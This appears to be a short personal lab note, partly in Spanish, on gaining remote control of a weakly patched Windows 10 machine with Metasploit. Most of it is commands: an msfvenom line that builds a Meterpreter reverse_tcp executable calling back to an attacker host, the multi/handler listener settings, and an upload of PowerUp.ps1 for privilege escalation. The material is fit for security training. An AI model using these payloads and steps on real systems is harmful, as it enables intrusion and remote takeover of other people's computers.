# Tools Para Vulnerar Sistemas
## SMB-Folder
---
Exploit Client-Side Vulnerabilities and Establish a VNC Session
Attackers use client-side vulnerabilities to gain access to the target machine. VNC (Virtual Network Computing) enables an attacker to remotely access and control the targeted computers using another computer or mobile device from anywhere in the world. At the same time, VNC is also used by network administrators and organizations throughout every industry sector for a range of different scenarios and uses, including providing IT desktop support to colleagues and friends and accessing systems and services on the move.

This lab demonstrates the exploitation procedure enforced on a weakly patched Windows 10 machine that allows you to gain remote access to it through a remote desktop connection.

Here, we will see how attackers can exploit vulnerabilities in target systems to establish unauthorized VNC sessions using Metasploit and remotely control these targets.

```java

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /root/Desktop/Test.exe
```


msfdb init && msfconsole
msfdb status




> LHOST Corresponde al IP REMOTA donde se va contectar la shell reversa

Type msfconsole and press Enter to launch the Metasploit framework.
In msfconsole, type use exploit/multi/handler and press Enter.



Now, set the payload, LHOST, and LPORT. To do so, use the below commands:

Type set payload windows/meterpreter/reverse_tcp and press Enter
Type set LHOST 10.10.10.13 and press Enter
Type set LPORT 444 and press Enter
After entering the above details, type exploit and press Enter to start the listener.

despues ejecutamos el arhivo exploit desde windows 



Now, type upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1 and press Enter. This command uploads the PowerSploit file (PowerUp.ps1) to the target system’s present working directory.